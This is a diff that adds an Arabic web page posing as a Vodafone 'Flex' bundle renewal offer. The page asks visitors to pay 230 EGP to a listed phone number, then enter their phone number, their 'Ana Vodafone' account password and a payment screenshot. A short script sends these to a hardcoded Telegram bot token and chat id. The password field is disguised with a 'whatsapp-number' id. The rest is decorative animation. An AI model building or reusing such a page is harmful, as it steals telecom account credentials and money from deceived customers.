@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wedoo Net - تجديد الباقة</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            text-align: center;
+            direction: rtl;
+            color: rgb(236, 236, 236);
+            background: #000000;
+            overflow: hidden;
+        }
+
+        .scene-container {
+            width: 100%;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        /* قطرات المطر */
+        .rain-container {
+            position: fixed;
+            top: 100px;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            pointer-events: none;
+        }
+
+        .rain-drop {
+            position: absolute;
+            width: 2px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.6);
+            opacity: 0.7;
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+         /* شريط العنوان */
+         .header {
+            background: linear-gradient(45deg, #ff512f, #0805a8);
+            padding: 20px;
+            font-size: 26px;
+            font-weight: bold;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 20px;
+            animation: bounce 1s infinite alternate;
+        }
+
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+        .discount-box {
+    background: #ffcc00;
+    color: black;
+    padding: 15px;
+    font-size: 18px;
+    font-weight: bold;
+    position: relative;
+    margin: 20px auto; /* توسيط العنصر */
+    width: 50%;
+    max-width: 750px;
+    text-align: center;
+    border-radius: 25px;
+    box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+    display: block; /* التأكد من التوسيط */
+}
+
+
+        .container {
+            margin-top: 50px;
+            width: 90%;
+            max-width: 400px;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            margin-left: auto;
+            margin-right: auto;
+            text-align: center;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        input {
+            background: #222;
+            color: white;
+            border: 1px solid #555;
+            transition: 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #ff3366;
+            outline: none;
+        }
+
+        button {
+            background: #6f03fc;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s ease;
+        }
+
+        button:hover {
+            background: #6302ff;
+        }
+
+        #success-message {
+            display: none;
+            background: #0f0;
+            color: white;
+            padding: 10px;
+            margin-top: 15px;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="scene-container">
+        <canvas id="webgl"></canvas>
+    </div>
+ <!-- تأثير المطر -->
+ <div class="rain-container"></div>
+    <div class="background"></div>
+
+    <div class="header">تفعيل 13 الف فليكس   </div>
+
+    <div class="discount-box">
+        سعر الباقه: <strong>230 جنيه</strong> <br>
+        ⚡ لازم تبقي علي نظام فليكس 260 <br>
+        <br>لازم ميكونش عليك سلف او نوته <br>
+        <strong>قم بتحويل المبلغ إلى وخد اسكرين بالتحويل : <strong>01097891442</strong></strong>
+    </div>
+
+    <div class="container">
+        <input type="text" id="phone-number" placeholder="📞 رقم الهاتف">
+        <input type="text" id="whatsapp-number" placeholder="🔑 باسورد أنا فودافون">
+        <input type="file" id="proof" accept="image/*">
+        <button onclick="sendData()">🔄 تجديد الباقة</button>
+        <div id="success-message">✅ تم تقديم طلبك بنجاح! سيتم تنفيذ الطلب خلال ساعة.</div>
+    </div>
+
+    <script>
+        function sendData() {
+            const phone = document.getElementById("phone-number").value;
+            const whatsapp = document.getElementById("whatsapp-number").value;
+            const fileInput = document.getElementById("proof");
+            const file = fileInput.files[0];
+
+            if (!phone || !whatsapp || !file) {
+                alert("⚠️ يرجى ملء جميع الحقول وتحميل صورة التحويل!");
+                return;
+            }
+
+            const botToken = "7916799067:AAHFnY6z26-uAOKOwSaG43OPgBo-EEdZ6OE"; // 🔹 ضع توكن البوت
+            const chatId = "6798744902"; // 🔹 ضع Chat ID الخاص بك
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("caption", `📌  13 طلب تجديد باقة جديد:\n📞 الهاتف: ${phone}\n🔑 باسورد: ${whatsapp}`);
+            formData.append("photo", file);
+
+            axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formData)
+                .then(response => {
+                    document.getElementById("success-message").style.display = "block";
+                })
+                .catch(error => {
+                    alert("❌ حدث خطأ أثناء إرسال الطلب!");
+                });
+        }
+    </script>
+
+    <script type="module">
+        import * as THREE from 'https://unpkg.com/three@0.162.0/build/three.module.js';
+
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer({ canvas: document.querySelector('#webgl'), antialias: true });
+
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+        camera.position.z = 3;
+
+        const geometry = new THREE.TorusKnotGeometry(1, 0.3, 100, 16);
+        const material = new THREE.MeshStandardMaterial({ color: 0xff3366, metalness: 0.7, roughness: 0.3 });
+
+        const torusKnot = new THREE.Mesh(geometry, material);
+        scene.add(torusKnot);
+
+        const light = new THREE.PointLight(0xffffff, 1, 100);
+        light.position.set(5, 5, 5);
+        scene.add(light);
+
+        function animate() {
+            requestAnimationFrame(animate);
+            torusKnot.rotation.x += 0.01;
+            torusKnot.rotation.y += 0.01;
+            renderer.render(scene, camera);
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        animate();
+        function createRain() {
+            const rainContainer = document.querySelector('.rain-container');
+            for (let i = 0; i < 50; i++) {
+                let drop = document.createElement('div');
+                drop.classList.add('rain-drop');
+                drop.style.left = `${Math.random() * 100}%`;
+                drop.style.animationDuration = `${Math.random() * 2 + 1}s`;
+                drop.style.animationDelay = `${Math.random() * 2}s`;
+                rainContainer.appendChild(drop);
+            }
+        }
+        createRain();
+    </script>
+</body>
+</html>
